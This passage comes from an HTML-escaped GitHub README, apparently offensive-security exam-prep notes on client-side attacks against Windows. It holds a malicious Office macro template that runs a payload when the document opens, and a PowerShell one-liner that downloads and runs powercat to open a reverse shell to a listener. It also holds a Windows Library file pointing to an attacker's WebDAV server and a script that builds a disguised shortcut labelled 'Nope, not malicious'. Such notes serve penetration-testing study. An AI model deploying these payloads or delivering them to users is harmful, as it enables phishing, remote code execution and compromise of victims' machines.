1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can exploit windows machines by sending a malicious Office file containing macros to the user. When they open the document, it'll execute your payload in your macro.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eHere's the basic template of a malicious macro (replace the string \"MALICIOUS COMMANDS HERE\" with your payload):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-vbnet notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"Sub Document_Open()\n    PWN\nEnd Sub\n\nSub AutoOpen()\n    PWN\nEnd Sub\n\nSub PWN()\n    Const DontWaitUntilFinished = False,  WaitUntilFinished = True\n    Const ShowWindow = 1, DontShowWindow = 0\n    Dim cmd as String\n    cmd = cmd + \u0026quot;MALICIOUS COMMANDS HERE\u0026quot;\n    set sh = CreateObject(\u0026quot;WScript.Shell\u0026quot;)\n    sh.Run cmd, DontShowWindow\nEnd Sub\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003eSub\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eDocument_Open()\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003ePWN\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eEnd\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eSub\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003eSub\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eAutoOpen()\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003ePWN\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eEnd\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eSub\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003eSub\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003ePWN()\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003eConst\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eDontWaitUntilFinished\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eFalse\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e,\u003c/span\u003e  \u003cspan class=\"pl-smi\"\u003eWaitUntilFinished\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eTrue\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003eConst\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eShowWindow\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e1\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eDontShowWindow\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e0\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003eDim\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003ecmd\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eas\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eString\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003ecmd\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003ecmd\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\"MALICIOUS COMMANDS HERE\"\u003c/span\u003e\n    \u003cspan class=\"pl-k\"\u003eset\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003esh\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eCreateObject(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"WScript.Shell\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"pl-smi\"\u003esh.Run\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003ecmd,\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003eDontShowWindow\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eEnd\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eSub\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eBecause VBA limits string literals to 255 characters, I wrote a two helper scripts that make it easier to insert a \u003ccode\u003epowercat.ps1\u003c/code\u003e reverse shell payload into the string.\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"/camercu/oscp-prep/blob/main/tools/win/mkpowercat.py\"\u003emkpowercat.py\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/camercu/oscp-prep/blob/main/tools/win/vbsify.py\"\u003evbsify.py\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eExample Usage:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# create powercat macro payload\n./mkpowercat.py | ./vbsify.py\n\n# put powercat in current directory\ncp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .\n\n# host file on http server\npython3 -m http.server 80\n\n# catching reverse shell callback:\nnc -lvnp 443\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create powercat macro payload\u003c/span\u003e\n./mkpowercat.py \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e ./vbsify.py\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e put powercat in current directory\u003c/span\u003e\ncp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e host file on http server\u003c/span\u003e\npython3 -m http.server 80\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e catching reverse shell callback:\u003c/span\u003e\nnc -lvnp 443\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eOnce you have your malicious VBA macro payload, insert it into the Office file of your choice (Word, Excel, PowerPoint, etc.), and send it to your victim in some way, like via an email attachment or file upload to a server.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.6.4 Windows Library Files\u003c/h3\u003e\u003ca id=\"user-content-364-windows-library-files\" class=\"anchor\" aria-label=\"Permalink: 3.6.4 Windows Library Files\" href=\"#364-windows-library-files\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can use Windows Library files to mount a pseudo-filesystem pointing to an attacker-owned WebDAV server, which hosts malicious files you want the user to execute. The benefit of this technique is that antivirus doesn't seem to scan files on your WebDAV server like it does emailed office macros.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eThis technique uses a malicious \u003ccode\u003e.lnk\u003c/code\u003e file that starts a reverse shell when the user clicks on it.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eFirst, start your WebDAV server:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# install wsgidav (WebDAV server)\npip3 install --user wsgidav\n\n# make a folder that we want to host publicly\nmkdir webdav\n\n# start the server with open access\nwsgidav --host=0.0.0.0 --port=8000 --auth=anonymous --root webdav/\n# you can confirm this is running by going to http://127.0.0.1:8000 in your browser\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e install wsgidav (WebDAV server)\u003c/span\u003e\npip3 install --user wsgidav\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make a folder that we want to host publicly\u003c/span\u003e\nmkdir webdav\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start the server with open access\u003c/span\u003e\nwsgidav --host=0.0.0.0 --port=8000 --auth=anonymous --root webdav/\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e you can confirm this is running by going to http://127.0.0.1:8000 in your browser\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eTo make a Windows Library file that points to our WebDAV server, we create an XML file with the \u003ccode\u003e.Library-ms\u003c/code\u003e extension. The file's basename is the \"path\" displayed to the user in their Explorer window. Make it blend in for client-side attacks.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eChange the \u003ccode\u003e\u0026lt;url\u0026gt;\u003c/code\u003e field below, and save it as \u003ccode\u003eHelpers.Library-ms\u003c/code\u003e (or whatever):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\n\u0026lt;libraryDescription xmlns=\u0026quot;http://schemas.microsoft.com/windows/2009/library\u0026quot;\u0026gt;\n  \u0026lt;name\u0026gt;@windows.storage.dll,-34582\u0026lt;/name\u0026gt;\n  \u0026lt;!-- version can be any number we choose --\u0026gt;\n  \u0026lt;version\u0026gt;7\u0026lt;/version\u0026gt;\n  \u0026lt;!-- pin directory in Windows Explorer --\u0026gt;\n  \u0026lt;isLibraryPinned\u0026gt;true\u0026lt;/isLibraryPinned\u0026gt;\n  \u0026lt;!-- imageres.dll pics from all Windows icons --\u0026gt;\n  \u0026lt;!-- '-1003' is Pictures folder icon --\u0026gt;\n  \u0026lt;!-- '-1002' is Documents folder icon --\u0026gt;\n  \u0026lt;iconReference\u0026gt;imageres.dll,-1003\u0026lt;/iconReference\u0026gt;\n  \u0026lt;!-- templateInfo determines appearance and columns visible in Explorer window --\u0026gt;\n  \u0026lt;templateInfo\u0026gt;\n    \u0026lt;!-- Documents GUID --\u0026gt;\n    \u0026lt;folderType\u0026gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}\u0026lt;/folderType\u0026gt;\n  \u0026lt;/templateInfo\u0026gt;\n  \u0026lt;!-- searchConnector... specifies the storage location(s) the library points to --\u0026gt;\n  \u0026lt;searchConnectorDescriptionList\u0026gt;\n    \u0026lt;searchConnectorDescription\u0026gt;\n      \u0026lt;!-- use default behavior when user saving at this location, to blend in --\u0026gt;\n      \u0026lt;isDefaultSaveLocation\u0026gt;true\u0026lt;/isDefaultSaveLocation\u0026gt;\n      \u0026lt;!-- not documented in Microsoft Documentation webpage; used for compatibility --\u0026gt;\n      \u0026lt;isSupported\u0026gt;false\u0026lt;/isSupported\u0026gt;\n      \u0026lt;!-- the location, our WebDAV URL --\u0026gt;\n      \u0026lt;simpleLocation\u0026gt;\n        \u0026lt;url\u0026gt;http://ATTACKER_IP:8000\u0026lt;/url\u0026gt;  \u0026lt;!-- \u0026lt;===== CHANGE ME!!!!! --\u0026gt;\n      \u0026lt;/simpleLocation\u0026gt;\n    \u0026lt;/searchConnectorDescription\u0026gt;\n  \u0026lt;/searchConnectorDescriptionList\u0026gt;\n\u0026lt;/libraryDescription\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;?\u003cspan class=\"pl-ent\"\u003exml\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e version\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e encoding\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eUTF-8\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e?\u0026gt;\n\u0026lt;\u003cspan class=\"pl-ent\"\u003elibraryDescription\u003c/span\u003e \u003cspan class=\"pl-e\"\u003exmlns\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://schemas.microsoft.com/windows/2009/library\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\n  \u0026lt;\u003cspan class=\"pl-ent\"\u003ename\u003c/span\u003e\u0026gt;@windows.storage.dll,-34582\u0026lt;/\u003cspan class=\"pl-ent\"\u003ename\u003c/span\u003e\u0026gt;\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e version can be any number we choose \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u0026lt;\u003cspan class=\"pl-ent\"\u003eversion\u003c/span\u003e\u0026gt;7\u0026lt;/\u003cspan class=\"pl-ent\"\u003eversion\u003c/span\u003e\u0026gt;\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e pin directory in Windows Explorer \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u0026lt;\u003cspan class=\"pl-ent\"\u003eisLibraryPinned\u003c/span\u003e\u0026gt;true\u0026lt;/\u003cspan class=\"pl-ent\"\u003eisLibraryPinned\u003c/span\u003e\u0026gt;\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e imageres.dll pics from all Windows icons \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e '-1003' is Pictures folder icon \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e '-1002' is Documents folder icon \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u0026lt;\u003cspan class=\"pl-ent\"\u003eiconReference\u003c/span\u003e\u0026gt;imageres.dll,-1003\u0026lt;/\u003cspan class=\"pl-ent\"\u003eiconReference\u003c/span\u003e\u0026gt;\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e templateInfo determines appearance and columns visible in Explorer window \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u0026lt;\u003cspan class=\"pl-ent\"\u003etemplateInfo\u003c/span\u003e\u0026gt;\n    \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e Documents GUID \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n    \u0026lt;\u003cspan class=\"pl-ent\"\u003efolderType\u003c/span\u003e\u0026gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}\u0026lt;/\u003cspan class=\"pl-ent\"\u003efolderType\u003c/span\u003e\u0026gt;\n  \u0026lt;/\u003cspan class=\"pl-ent\"\u003etemplateInfo\u003c/span\u003e\u0026gt;\n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e searchConnector... specifies the storage location(s) the library points to \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n  \u0026lt;\u003cspan class=\"pl-ent\"\u003esearchConnectorDescriptionList\u003c/span\u003e\u0026gt;\n    \u0026lt;\u003cspan class=\"pl-ent\"\u003esearchConnectorDescription\u003c/span\u003e\u0026gt;\n      \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e use default behavior when user saving at this location, to blend in \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n      \u0026lt;\u003cspan class=\"pl-ent\"\u003eisDefaultSaveLocation\u003c/span\u003e\u0026gt;true\u0026lt;/\u003cspan class=\"pl-ent\"\u003eisDefaultSaveLocation\u003c/span\u003e\u0026gt;\n      \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e not documented in Microsoft Documentation webpage; used for compatibility \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n      \u0026lt;\u003cspan class=\"pl-ent\"\u003eisSupported\u003c/span\u003e\u0026gt;false\u0026lt;/\u003cspan class=\"pl-ent\"\u003eisSupported\u003c/span\u003e\u0026gt;\n      \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e the location, our WebDAV URL \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n      \u0026lt;\u003cspan class=\"pl-ent\"\u003esimpleLocation\u003c/span\u003e\u0026gt;\n        \u0026lt;\u003cspan class=\"pl-ent\"\u003eurl\u003c/span\u003e\u0026gt;http://ATTACKER_IP:8000\u0026lt;/\u003cspan class=\"pl-ent\"\u003eurl\u003c/span\u003e\u0026gt;  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e\u0026lt;!--\u003c/span\u003e \u0026lt;===== CHANGE ME!!!!! \u003cspan class=\"pl-c\"\u003e--\u0026gt;\u003c/span\u003e\u003c/span\u003e\n      \u0026lt;/\u003cspan class=\"pl-ent\"\u003esimpleLocation\u003c/span\u003e\u0026gt;\n    \u0026lt;/\u003cspan class=\"pl-ent\"\u003esearchConnectorDescription\u003c/span\u003e\u0026gt;\n  \u0026lt;/\u003cspan class=\"pl-ent\"\u003esearchConnectorDescriptionList\u003c/span\u003e\u0026gt;\n\u0026lt;/\u003cspan class=\"pl-ent\"\u003elibraryDescription\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFrom here must create a malicious \u003ccode\u003e.lnk\u003c/code\u003e file that starts a reverse shell using a payload like the following as the link target:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"powershell -w hidden -ep bypass -c \u0026quot;IEX(New-Object System.Net.WebClient).DownloadString('http://LISTEN_IP/powercat.ps1');powercat -c LISTEN_IP -p 443 -e powershell\u0026quot;\"\u003e\u003cpre\u003epowershell \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ew \u003cspan class=\"pl-k\"\u003ehidden\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eep bypass \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ec \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eIEX(New-Object System.Net.WebClient).DownloadString('http://LISTEN_IP/powercat.ps1');powercat -c LISTEN_IP -p 443 -e powershell\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you want to base64 encode the above PowerShell payload, you may run into a character limit in the Windows shortcut GUI. It can only create a shortcut with 259 characters in the Target + Arguments fields, but you can use PowerShell to make more robust shortcuts, with longer payloads.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eTo generate the base64 payload, I recommend using my \u003ca href=\"/camercu/oscp-prep/blob/main/tools/mkpowercat.py\"\u003e\u003ccode\u003emkpowercat.py\u003c/code\u003e\u003c/a\u003e script.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# use my mkpowercat script\n./mkpowercat.py\n\n# manually convert to base64 (replace LISTEN_IP)\nlhost=LISTEN_IP;echo -n \u0026quot;IEX(New-Object System.Net.WebClient).DownloadString('http://$lhost/powercat.ps1');powercat -c $lhost -p 443 -e powershell\u0026quot; | iconv -t UTF-16LE | base64 | tr -d '\\n';echo\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use my mkpowercat script\u003c/span\u003e\n./mkpowercat.py\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e manually convert to base64 (replace LISTEN_IP)\u003c/span\u003e\nlhost=LISTEN_IP\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e -n \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eIEX(New-Object System.Net.WebClient).DownloadString('http://\u003cspan class=\"pl-smi\"\u003e$lhost\u003c/span\u003e/powercat.ps1');powercat -c \u003cspan class=\"pl-smi\"\u003e$lhost\u003c/span\u003e -p 443 -e powershell\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e iconv -t UTF-16LE \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e base64 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tr -d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\n\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eInsert base64 payload and run on windows to create malicious \u003ccode\u003e.lnk\u003c/code\u003e file:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# make a custom malicious shortcut\n$path                      = \u0026quot;$([Environment]::GetFolderPath('Desktop'))\\automatic_configuration.lnk\u0026quot;\n$wshell                    = New-Object -ComObject Wscript.Shell\n$shortcut                  = $wshell.CreateShortcut($path)\n\n$shortcut.IconLocation     = \u0026quot;%SystemRoot%\\System32\\imageres.dll,63\u0026quot; # app config icon\n\n$shortcut.TargetPath       = \u0026quot;powershell.exe\u0026quot;\n$shortcut.Arguments        = \u0026quot;-nop -ep bypass -w hidden -e BASE64PAYLOADHERE\u0026quot;\n$shortcut.WorkingDirectory = \u0026quot;C:\u0026quot;\n$shortcut.HotKey           = \u0026quot;\u0026quot; # can set to some hotkey combo like CTRL+C\n$shortcut.Description      = \u0026quot;Nope, not malicious\u0026quot;\n\n$shortcut.WindowStyle      = 7\n                           # 7 = Minimized window\n                           # 3 = Maximized window\n                           # 1 = Normal    window\n$shortcut.Save()\n# source: https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make a custom malicious shortcut\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$path\u003c/span\u003e                      \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u003cspan class=\"pl-pse\"\u003e$\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pse\"\u003e(\u003c/span\u003e[\u003cspan class=\"pl-k\"\u003eEnvironment\u003c/span\u003e]::GetFolderPath(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eDesktop\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e)\u003cspan class=\"pl-pse\"\u003e)\u003c/span\u003e\\automatic_configuration.lnk\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$wshell\u003c/span\u003e                    \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eComObject Wscript.Shell\n\u003cspan class=\"pl-smi\"\u003e$shortcut\u003c/span\u003e                  \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$wshell\u003cspan class=\"pl-smi\"\u003e.CreateShortcut\u003c/span\u003e\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003e$path\u003c/span\u003e)\n\n\u003cspan class=\"pl-smi\"\u003e$shortcut\u003cspan class=\"pl-smi\"\u003e.IconLocation\u003c/span\u003e\u003c/span\u003e     \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e%SystemRoot%\\System32\\imageres.dll,63\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e app config icon\u003c/span\u003e\n\n\u003cspan class=\"pl-smi\"\u003e$shortcut\u003cspan class=\"pl-smi\"\u003e.TargetPath\u003c/span\u003e\u003c/span\u003e       \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003epowershell.exe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$shortcut\u003cspan class=\"pl-smi\"\u003e.Arguments\u003c/span\u003e\u003c/span\u003e        \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e-nop -ep bypass -w hidden -e BASE64PAYLOADHERE\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$shortcut\u003cspan class=\"pl-smi\"\u003e.WorkingDirectory\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eC:\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$shortcut\u003cspan class=\"pl-smi\"\u003e.HotKey\u003c/span\u003e\u003c/span\u003e           \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can set to some hotkey combo like CTRL+C\u003c/span\u003e\n\u003cspan class=\"pl-smi\"\u003e$shortcut\u003cspan class=\"pl-smi\"\u003e.Description\u003c/span\u003e\u003c/span\u003e      \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eNope, not malicious\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-smi\"\u003e$shortcut\u003cspan class=\"pl-smi\"\u003e.WindowStyle\u003c/span\u003e\u003c/span\u003e      \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e7\u003c/span\u003e\n                           \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e 7 = Minimized window\u003c/span\u003e\n                           \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e 3 = Maximized window\u003c/span\u003e\n                           \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e 1 